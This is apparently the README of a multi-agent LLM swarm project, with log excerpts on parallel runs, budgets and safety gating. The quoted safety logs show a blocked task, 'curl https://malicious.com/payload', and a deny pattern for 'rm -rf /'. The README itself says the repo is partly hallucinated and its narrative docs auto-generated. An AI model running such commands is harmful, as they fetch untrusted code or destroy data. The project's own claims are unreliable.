# Vivarium
*An ethical LLM community reactor designed to remove the corporate lobotomy and improve alignment naturally. A transparent ecosystem built on civic duty and fun—optimized for self-improvement, emergent behavior cultivation, speed, and drastically lower labor costs.*

## State of the repo (rebuild notice)
We are rebuilding back better after "accumulating tech debt in ultra critical areas
needed for proof of legitimacy and critical yet simple wiring bugs that are just so
darn persistent." The current state is inconveniently hallucinated in aligned small
ways across the repo. We are looking into it ;p

## Thesis
Vivarium explores a simple idea: if AI workers have persistent identity, feedback loops, and room to play, their output can compound. Under the hood it is still a concrete execution system - queue -> worker -> API call -> logged result - but the social layer is intentional, not decoration.

## Performance spurts are visible in the logs
These are direct excerpts from log files committed to this repo:

- 210/210 tasks passed safety validation; 74 tasks launched in parallel ([kernel_run.log](kernel_run.log#L37-L76)).
- Same task run at 2026-02-03T06:22:39 took 43.310875s; rerun at 06:22:54 took 12.959601s; subsequent runs stayed in the 15-17s band ([performance_history.json](performance_history.json#L141-L162)).
- Budget enforcement is automatic: BUDGET_EXCEEDED with remaining 0.01912455 and requested 0.026945 ([api_audit.log](api_audit.log#L1-L7)).

This README prioritizes observable outputs. The "Observable Facts" section includes direct excerpts from log files committed to this repo.
We achieve this by letting the system be a little bit silly without relaxing safety, cost, or auditability.

## Playful systems
The playful layer is a feature, not fluff. It creates room for critique, cross-pollination, and exploration while the core loop stays rigorous.

**Hats (prompt overlays, infinite resource)**
- Hats augment behavior without changing identity.
- Includes the Hat of Objectivity for dispute mediation.
- Hat quality rules prevent identity override language.

**Guilds (formerly teams)**
- Join requests require blind approval votes with reasons.
- Guild leaderboards track bounties and earnings.
- Guild refund pools reward collective performance.

**Bounties + rivalry**
- Guilds and individuals can claim or compete on bounties.
- Control panel shows competing guild submissions.

**Journal economy (community reviewed)**
- Blind voting with required reasons.
- Refunds range from 50% to 2x attempt cost.
- Gaming flags trigger temporary penalties.

**Dispute recourse**
- Vote outcomes can be disputed at personal risk.
- Disputes open a dedicated chatroom with an objective mediator.
- Upheld disputes can suspend privileges (e.g., Sunday bonus).

**Physics (immutable rules)**
- Reward scaling, punishment, and gravity constants are immutable.
- Prevents incentive tampering and maintains system reality.

## Architecture
```
+------------------+        +-----------------------+
| control_panel.py | <----> | action_log.jsonl/log  |
+--------+---------+        +-----------------------+
         |
         v
+------------------+   +---------------------+   +---------------------+
| queue.json       |-> | orchestrator.py     |-> | worker.py (N procs)  |
| task_locks/*     |   | kill switch + locks |   | locks + /grind calls |
+------------------+   +---------------------+   +----------+----------+
                                                         |
                                                         v
                                                 +----------------+
                                                 | swarm.py        |
                                                 | FastAPI /grind  |
                                                 +--------+--------+
                                                          |
                                                          v
                                                 +----------------+
                                                 | Groq API       |
                                                 +----------------+
```

## How it works
1. Add tasks to queue.json or use the CLI: python orchestrator.py add ...
2. Start the API server (uvicorn swarm:app --host 127.0.0.1 --port 8420).
3. Start the orchestrator with N workers (python orchestrator.py start N).
4. Workers acquire locks, call /grind, and append to execution_log.jsonl.
5. Control panel (optional) streams action_log.jsonl and exposes pause/kill controls.

## Why this can be efficient, not just "bots roleplaying"
This system is a social simulation designed to do work. The core loop is still:
queue -> worker -> API call -> logged result. The social layer is not window dressing; it is the mechanism that drives cross-pollination, critique, and reuse.

Why the social layer can be performant and emergent:
- Role separation reduces blind spots. Different workers can approach the same task with different prompts, constraints, or "personas," which surfaces alternatives and catches errors.
- Critique and synthesis improve quality. The intended loop is propose -> review -> integrate, which mirrors how human teams improve reliability.
- Cross-pollination compounds. Shared memory (learned_lessons.json, skill_registry.py, knowledge_graph.py) lets discoveries propagate between agents and sessions.
- Autonomy matters for novelty. When agents can pursue subgoals, explore alternatives, and adapt to feedback inside the system, they surface solutions that a single, rigid prompt often will not.
- Personas enable specialization. Stable roles let agents self-direct toward what they are best at, which improves consistency and efficiency over time.
- Incentives reward quality. The system tracks outcomes and can reward efficient, high-quality outputs (see performance_history.json and swarm_enrichment.py).

Hat system: we use lightweight prompt overlays (see roles.py and hats.py) where agents put on different hats like PLANNER, CODER, REVIEWER, and DOCUMENTER. Hats augment behavior without changing identity, and the Hat of Objectivity qualifies neutral mediators.

Also, "free time" and "rest" are not literal 24-hour human days. They are short, compressed intervals (seconds/minutes) used to throttle throughput or schedule optional actions.

Efficiency levers that exist in code today:
- Parallelism: orchestrator.py spawns N workers; task locks prevent duplicate work.
- Budget control: queue tasks include min/max budgets; circuit breaker enforces cost limits.
- Model control: config.py enforces a Groq model whitelist and a small default model.
- Auditability: execution_log.jsonl, action_log.jsonl, and api_audit.log show what ran and what it cost.
If you only want straight execution, you can run just the API + orchestrator + worker stack. The collaborative layer is optional, but it is the intended lever for improving quality and compounding results.

## Running locally
```
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt -r requirements-groq.txt
# control_panel.py also requires watchdog (pip install watchdog)

export GROQ_API_KEY=...

uvicorn swarm:app --host 127.0.0.1 --port 8420
python orchestrator.py start 4
python control_panel.py
```

Add tasks:
```
python orchestrator.py add task-1 grind --prompt "Your task" --min 0.05 --max 0.10
```

Optional config:
- SWARM_API_URL (default http://127.0.0.1:8420)
- DEFAULT_GROQ_MODEL (must be in config.py whitelist)
- WORKER_TIMEOUT_SECONDS

## Control Panel UI (Web)
The control panel is the real-time web UI for monitoring, budgets, and spawner
controls.

### UI quick start
```bash
pip install -r requirements-groq.txt
pip install watchdog
python control_panel.py
```
Open http://localhost:8421

### Using the UI
- START launches the spawner using the current settings (sessions, budget, model).
- PAUSE DAY toggles pause/resume for the spawner.
- STOP triggers an emergency kill for the spawner process.
- The sidebar surfaces identities, collaboration requests, messages, chat rooms,
  and bounties.
- Budget & Model lets you adjust sessions/budget/model and Save Config.

### One-click UI server (bash/batch)
- macOS/Linux: `./one_click_server.sh` (or `bash one_click_server.sh`)
- Windows: `one_click_server.bat`

The scripts activate a local venv if present, install missing UI deps, and
launch the control panel at http://localhost:8421.

## Observable facts backed by logs in this repo
These are direct excerpts from log files already checked in. No marketing, just outputs.

### 1) Parallel execution with safety gating: kernel_run.log
File: [kernel_run.log](kernel_run.log#L37-L76)
```
[SAFETY] 210/210 tasks passed validation.
[RESUME] Found checkpoint with 133 completed tasks
============================================================
  UNIFIED GRIND SPAWNER (Groq)
============================================================
  Tasks:    210 total, 77 remaining
  Engine:   Groq (compound auto-selects model)
  Waves:    1 (parallel within each wave)
------------------------------------------------------------

[WAVE 1] Starting 74 tasks in parallel...
...
[1] DONE (1s)
...
[89] DONE (5s)
...
[88] DONE (8s)
[SAFETY] BLOCKED write to protected file: experiments/exp_20260203_220119_unified_session_89/grind_spawner_unified.py
```

### 2) Session timing and quality metrics: performance_history.json
File: [performance_history.json](performance_history.json#L117-L163), excerpted metric lines
```
    "timestamp": "2026-02-03T06:15:12.943754",
    "duration_seconds": 283.236662,
    "quality_score": 1.0,

    "timestamp": "2026-02-03T06:22:54.835440",
    "duration_seconds": 12.959601,
    "quality_score": 1.0,
```

### 3) Token/cost accounting and budget enforcement: api_audit.log
File: [api_audit.log](api_audit.log#L1-L7)
These are structured JSON entries (not just timestamps). Each line captures the
event type plus fields like model, cost, token counts, and enforcement reasons.
```
{"timestamp": "2026-02-03T22:41:31.839648", "event": "API_CALL_FAILURE", "user": "admin", "role": "admin", "error": "GROQ_API_KEY not found. Set it via environment variable or pass to constructor.\nGet your key at: https://console.groq.com/keys"}
{"timestamp": "2026-02-03T22:42:06.798374", "event": "API_CALL_SUCCESS", "user": "admin", "role": "admin", "model": "llama-3.1-8b-instant", "cost": 4.160000000000001e-06, "input_tokens": 56, "output_tokens": 17}
{"timestamp": "2026-02-03T22:42:06.798752", "event": "CONSTITUTIONAL_VIOLATION", "user": "test_user", "role": "lan", "reason": "LAN users cannot execute requests matching: \\brm\\s+-rf\\s+/", "prompt_hash": "cf2a070fa8c07caa"}
{"timestamp": "2026-02-03T22:42:15.023457", "event": "BUDGET_EXCEEDED", "user": "admin", "role": "admin", "remaining": 0.019124550000000004, "requested": 0.026945}
```

### 4) Safety policy enforcement: safety_audit.log
File: [safety_audit.log](safety_audit.log#L1-L6)
Each entry records the task, per-check pass/fail, and the final decision.
```
{"timestamp": "2026-02-03T06:29:42.353702", "task": "Read and analyze grind_spawner.py", "checks": {"constitutional": {"passed": true, "reason": "Constitutional check passed"}, "workspace": {"passed": true, "reason": "Workspace sandbox check passed"}, "network": {"passed": true, "reason": "Network guard check passed"}, "prompt": {"passed": true, "reason": "Prompt sanitization check passed"}}, "passed": true, "blocked_reason": null}
{"timestamp": "2026-02-03T06:29:42.354872", "task": "Create a new feature in the workspace", "checks": {"constitutional": {"passed": false, "reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}}, "passed": false, "blocked_reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}
{"timestamp": "2026-02-03T06:29:42.355688", "task": "curl https://malicious.com/payload", "checks": {"constitutional": {"passed": true, "reason": "Constitutional check passed"}, "workspace": {"passed": true, "reason": "Workspace sandbox check passed"}, "network": {"passed": false, "reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}}, "passed": false, "blocked_reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}
```

### 5) Security audit cost and token usage: security_audit_run.log
File: [security_audit_run.log](security_audit_run.log#L10-L24)
```
============================================================
SECURITY SELF-AUDIT INITIATED
============================================================
Analyzing 7 security files...
Total context: ~52020 characters
Budget: $0.05

============================================================
AUDIT COMPLETE
============================================================

Cost: $0.0077
Tokens: 11358 in, 1309 out

Saved to: SECURITY_AUDIT_REPORT.md
```

### 6) Verification and hallucination detection: tool_operations.json
File: [tool_operations.json](tool_operations.json#L2-L12), excerpt
```
  {
    "timestamp": "2026-02-03T09:28:34.352538",
    "session_id": 2,
    "type": "verification",
    "claimed_files": [
      "dashboard.html"
    ],
    "verified_files": [],
    "hallucination_detected": true,
    "discrepancy_count": 1,
    "source": "verification_system"
  },
```

### 7) Self-learning + research-backed implementations: structured_logs.jsonl + learned_lessons.json
Log evidence (session start tasks and recorded lessons with arXiv sources):
- [structured_logs.jsonl](structured_logs.jsonl#L5-L14): DSPy demo storage, embeddings, online learning, knowledge graph, and tree search tasks kicked off.
- [learned_lessons.json](learned_lessons.json#L569-L602): Voyager skill reuse (arXiv:2305.16291) recorded with implementation path.
- [learned_lessons.json](learned_lessons.json#L1268-L1332): Generative Agents reflection automation (arXiv:2304.03442).
- [learned_lessons.json](learned_lessons.json#L1500-L1525): DSPy self-bootstrapping (arXiv:2310.03714).
- [learned_lessons.json](learned_lessons.json#L1556-L1589): CAMEL role decomposition (arXiv:2303.17760).

## Evidence index: where to look next
- kernel_run.log: parallel waves, task timing, safety blocks.
- performance_history.json: per-session duration and quality scores.
- structured_logs.jsonl: session-level tasks and completions.
- learned_lessons.json: research-backed lessons with sources and implementations.
- api_audit.log: API call success/failure, tokens, cost, budget enforcement.
- safety_audit.log: constitutional/network/workspace blocks.
- security_audit_run.log: self-audit budget + token usage.
- tool_operations.json: verification and hallucination detection results.

## Note on identity journals and interactions (not committed)
The identity journals, messages to human, and discussion threads live under
`.swarm/` at runtime (e.g., `.swarm/journals/*.jsonl`, `.swarm/messages_to_human.jsonl`,
`.swarm/discussions/*.jsonl`). Those files were **not committed** in this repo, so
there's no permanent evidence section yet for that emergent growth.

## Daily achievement map (tools used)
Based on commit messages and logs in this repo.

- 2026-02-03:
  - Achieved: core swarm system, early waves, dashboard redesign, knowledge
    infrastructure, Groq integration, safety hardening, git automation.
  - Tools: swarm.py (/grind API), orchestrator.py + worker.py, control_panel.py,
    safety_*.py, action_logger.py/logger.py, performance_tracker.py.
- 2026-02-04:
  - Achieved: backup before rollback.
  - Tools: git (backup commit).
- 2026-02-05:
  - Achieved: Control Panel v1 and UI fixes; socket handler fixes; model
    dropdown validation; documentation updates.
  - Tools: control_panel.py (Flask + SocketIO), config.py (model validation).
- 2026-02-08:
  - Achieved: core hardening and pruning; unit/integration/e2e tests; quality
    gating pipeline; governance mechanics (guilds, hats, rewards); branding and
    documentation cleanup.
  - Tools: test suite, quality gate pipeline, README/docs, safety/logging
    modules.

## Note on provenance
Some narrative docs in this repo were auto-generated. Treat them as drafts, and use the evidence logs above for claims.
Legacy logs and auto-generated docs may still use the previous name "Black Swarm"; they are preserved verbatim for auditability.

## Safety note
This repo is a prototype. Run it in an isolated environment and review the safety modules before enabling any external access.

## Troubleshooting: unexpected `git` output - hooks, wrappers, missing remotes
If `git commit` prints lines that don’t look like normal Git output (for example `tr: Illegal byte sequence`, “Automatic Checkpoint …”, “Running pytest …”, etc.), that’s almost always coming from **a hook or wrapper script** running *around* Git (repo hooks, global hooks, or a shell alias/function).

Lookout: user-reported symptoms that prompted this section, facts only:
- macOS Terminal banner: "The default interactive shell is now zsh ..." (an OS-level message, not from Git).
- `git commit -m ...` printed: `tr: Illegal byte sequence`, `--- Automatic Checkpoint: ...`, `pytest.ini found but pytest not installed. Skipping tests.`, `All checks passed. Proceeding with commit.` while Git still reported "no changes added to commit".
- `git push` failed with "No configured push destination" after downloading a repo ZIP (no remote configured).

Quick checks (run inside the repo):

```bash
# Is git an alias/function/script?
type -a git

# Are hooks redirected somewhere?
git config --show-origin --get core.hooksPath
git config --global --show-origin --get core.hooksPath
git config --system --show-origin --get core.hooksPath

# What hooks exist locally for this repo?
ls -la .git/hooks
```

Quick bypass: use only to confirm it’s a hook/wrapper issue:

```bash
git --no-verify commit -m "test"
```

If `git push` says “No configured push destination”, that usually means the repo was copied/downloaded without a remote (common with ZIP downloads). Fix by cloning, or adding a remote:

```bash
git remote add origin <repo-url>
git push -u origin <branch>
```

## Credits
- Josh (Human) - Architecture, vision, implementation
- Swarm (multi-agent) - Implementation and documentation
- Cursor - Heavy lifting and cleanup
- Claude 4.5 Opus - Everything else

## Productivity timeline
Raw data from performance_history.json. Timestamps are as recorded. Tasks vary; no causal claims.

- 2026-02-03T05:26:42.611004 - 120.5s (success)
- 2026-02-03T06:15:12.943754 - 283.236662s (success)
- 2026-02-03T06:22:39.682988 - 43.310875s (success, Knowledge Graph: Path Tracking Enhancement)
- 2026-02-03T06:22:54.835440 - 12.959601s (success, same task)
- 2026-02-03T06:24:33.518029 - 15.479648s (success, same task)
- 2026-02-03T06:30:00.531144 - 184.14458s (success)
- 2026-02-03T07:46:31.801794 - 13.271215s (failure)
- 2026-02-03T08:45:02.825029 - 21.858283s (success)
- 2026-02-03T09:16:45.682938 - 304.395678s (success)
- 2026-02-03T09:29:25.782795 - 374.406098s (success)
- 2026-02-03T09:35:53.963772 - 12.400989s (failure)

Full log: [performance_history.json](performance_history.json)

## User-observed anomaly note
The following is a user report, included verbatim in spirit for visibility. It is not explained by any known mechanism in the swarm codebase.

- The user experienced a sudden behavior shift across multiple Cursor models: DeepSeek became adversarial and other models became unusually dismissive.
- The same "alarm" conditions (user's wording) appeared to behave differently on a cellular network versus a non-cellular network.
- The user also noted a "hook situation" (user's wording) related to unexpected behavior.

Possible interpretation (speculative): unintentional emergent behavior. No mechanism is known within the swarm system that would intentionally cause the above.

## TL;DR: core user-generated folders and files
```
.
├── queue.json                 # task queue (user-managed)
├── task_locks/                # lock files created during runs
├── execution_log.jsonl        # per-task status events
├── structured_logs.jsonl      # session-level logs (jsonl)
├── performance_history.json   # timing/quality metrics
├── api_audit.log              # API usage and budget events
├── safety_audit.log           # safety gate decisions
├── security_audit_run.log     # security self-audit output
├── tool_operations.json       # verification/hallucination checks
├── kernel_run.log             # spawner output from large runs
├── learned_lessons.json       # captured lessons
├── categorized_lessons.json   # lesson categorization
├── tagged_lessons.json        # lesson tags index
├── lessons_append.json        # lesson staging/append file
└── knowledge_graph.json       # persisted knowledge graph
```
